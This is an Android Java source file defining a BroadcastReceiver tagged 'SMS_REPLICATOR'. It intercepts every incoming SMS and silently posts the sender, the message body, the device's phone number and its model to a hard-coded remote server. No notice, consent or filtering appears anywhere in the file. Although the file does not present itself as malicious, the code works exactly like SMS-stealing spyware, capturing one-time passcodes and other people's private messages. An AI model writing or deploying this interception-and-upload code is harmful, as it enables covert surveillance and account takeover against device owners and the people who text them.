package com.example.mysms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.telephony.TelephonyManager;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.IOException;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SMS_REPLICATOR";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                if (sms == null) continue;

                String sender = sms.getOriginatingAddress();
                String message = sms.getMessageBody();

                Log.d(TAG, "From: " + sender + ", Message: " + message);

                sendToServer(context, sender, message);
            }
        } catch (Exception e) {
            Log.e(TAG, "Crash in onReceive: " + e.getMessage(), e);
        }
    }

    public static void sendToServer(Context context, String sender, String message) {
        OkHttpClient client = new OkHttpClient();

        // Get phone number (may be null)
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNumber = null;
        try {
            phoneNumber = tm.getLine1Number();
        } catch (SecurityException e) {
            phoneNumber = "unknown";
        }

        // Get device model
        String deviceModel = android.os.Build.MODEL;
        String deviceManufacturer = android.os.Build.MANUFACTURER;
        String deviceName = deviceManufacturer + " " + deviceModel;

        // Combine
        String receiverId = (phoneNumber != null ? phoneNumber : "unknown") + " " + deviceName;
        System.out.println(receiverId);

        RequestBody formBody = new FormBody.Builder()
                .add("sender", sender != null ? sender : "unknown")
                .add("receiver", receiverId)
                .add("message", message != null ? message : "")
                .build();

        Request request = new Request.Builder()
                .url("https://code-snippets-backend.onrender.com/sms")  // ✅ Use your real URL
                .post(formBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onResponse(Call call, Response response) {
                Log.d(TAG, "SMS posted to server. Code: " + response.code());
            }

            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to post SMS: " + e.getMessage(), e);
            }
        });
    }
}
